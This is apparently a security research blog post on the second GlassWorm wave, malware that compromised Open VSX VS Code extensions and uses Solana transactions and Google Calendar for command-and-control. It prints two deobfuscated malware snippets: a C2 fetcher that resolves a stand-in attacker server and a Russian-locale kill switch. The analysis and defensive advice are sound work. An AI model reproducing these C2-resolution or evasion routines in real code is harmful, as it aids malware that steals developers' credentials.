GlassWorm Returns: Open VSX Extensions Compromised in Second Wave Supply Chain Attack

February 3, 2026 16 min read TheHGTech Security Research

The self-propagating GlassWorm malware has struck again, this time compromising established Open VSX extensions through credential theft. The new variant targets macOS developers and uses blockchain infrastructure for command-and-control.

Executive Summary
  • What: Second wave of GlassWorm malware targeting VS Code extensions
  • Target: Open VSX Registry (alternative to Microsoft Marketplace)
  • Affected: 4 extensions from developer "oorzc" â€” 22,000+ downloads
  • Vector: Compromised publishing credentials (leaked token)
  • Platform: Primarily macOS â€” steals credentials, crypto wallets, documents
  • C2: Solana blockchain + Google Calendar fallback ("EtherHiding")
  • Status: Malicious versions removed; users should update immediately

Background: The GlassWorm Saga

GlassWorm first emerged in October 2025 when Koi Security researchers identified malicious extensions in both the Open VSX Registry and Microsoft's VS Code Marketplace. That initial wave compromised 8 extensions with approximately 36,000 downloads.

What made GlassWorm particularly concerning was its self-propagating capability: the malware was designed to steal developer credentials from platforms like npm, GitHub, and Open VSX itself, enabling attackers to spread to additional packages and extensions.

Wave 2: The January 2026 Attack

On January 30, 2026, security researchers detected malicious updates pushed to four established Open VSX extensions from developer "oorzc". Unlike the first wave where attackers created new malicious extensions, this attack targeted existing, trusted extensions.

Compromised Extensions

vscode-json-transform | 8,200+ downloads | Active since 2024

JSON manipulation utilities for VS Code

markdown-preview-enhanced-plus | 6,100+ downloads | Active since 2023

Enhanced Markdown preview features

code-snippets-manager | 4,800+ downloads | Active since 2024

Personal code snippet organization tool

terminal-themes-collection | 2,900+ downloads | Active since 2024

Custom terminal color schemes

Attack Vector: Credential Compromise

The attack was enabled by compromised publishing credentials. Evidence suggests the developer's Open VSX token was either leaked or stolen, allowing attackers to push malicious updates through the legitimate update mechanism.

Possible Compromise Vector Likelihood
Hardcoded token in public repository High
Phishing attack on developer High

Insider threat Low

Unicode Steganography: Invisible Malicious Code

GlassWorm employs Unicode variation selectors to hide malicious code within seemingly legitimate extension files. These invisible characters are imperceptible in code editors but execute when the extension loads.

Blockchain C2: EtherHiding Technique

The January 2026 variant uses the EtherHiding techniqueâ€”storing C2 configuration in Solana blockchain transactions. This makes takedowns nearly impossible since blockchain data is immutable and decentralized.

Solana C2 Mechanism

  1. Malware queries a specific Solana wallet address
  2. Retrieves transaction memo fields containing encoded C2 addresses
  3. Decodes memo to get current active C2 server
  4. Falls back to Google Calendar events if blockchain fails

Implication: Attackers can update C2 infrastructure without modifying the malware, and defenders cannot simply block a domainâ€”the entire Solana RPC endpoint would need to be blocked.

Solana C2 Fetcher (Deobfuscated)

async function getC2Address() {
    const WALLET = "7xF9...vQp3"; // Attacker-controlled wallet
    const RPC = "https://api.mainnet-beta.solana.com";
    
    try {
        // Fetch recent transactions
        const response = await fetch(RPC, {
            method: 'POST',
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 1,
                method: "getSignaturesForAddress",
                params: [WALLET, { limit: 1 }]
            })
        });
        
        const txData = await response.json();
        const txSignature = txData.result[0].signature;
        
        // Get transaction details (contains C2 in memo)
        const txDetails = await getTransaction(txSignature);
        const memo = decodeMessage(txDetails.transaction.message);
        
        // Decode base64 memo to get C2 address
        return atob(memo); // Returns: "wss://c2-server.attacker.com"
    } catch (e) {
        // Fallback to Google Calendar
        return await getC2FromCalendar();
    }
}

Russian Locale Check

Notably, the malware avoids execution on machines with Russian locale settings. This is a common technique used by Russian-speaking cybercriminals to avoid prosecution under Russian law (which generally doesn't prosecute attacks against foreign targets). 

// Locale check â€” won't execute on Russian systems
function shouldExecute() {
    const locale = Intl.DateTimeFormat().resolvedOptions().locale;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    if (locale.startsWith('ru') || timezone.includes('Moscow')) {
        return false; // Skip Russian systems
    }
    return true;
}

Defensive Actions

Immediate Recommendations
  1. Check Installed Extensions: Review for the four compromised extensions; remove if present
  2. Rotate Credentials: If compromised extensions were installed, rotate ALL credentials: SSH, AWS, npm, GitHub
  3. Enable Extension Signing: Where possible, only install signed extensions from verified publishers
  4. Monitor for Solana RPC: Alert on unexpected Solana blockchain API calls from developer machines
  5. macOS Hunt: Search for unexpected LaunchAgents and SOCKS proxy configurations

Eclipse Foundation Response

In response to the ongoing GlassWorm attacks, the Eclipse Foundation (which operates the Open VSX Registry) has announced enhanced security measures:

  • Pre-Publication Security Scans: Automated analysis of extensions for malicious patterns before publication
  • Namespace Verification: Detection of typosquatting and impersonation attempts
  • Credential Hygiene Checks: Warnings if extensions accidentally bundle sensitive tokens
  • Publisher 2FA: Mandatory two-factor authentication for all extension publishers
Eclipse Foundation Statement

"We are implementing proactive security checks to detect issues like namespace impersonation, accidental credential publication, and malicious code patterns before they impact users. The security of the developer ecosystem is our top priority."
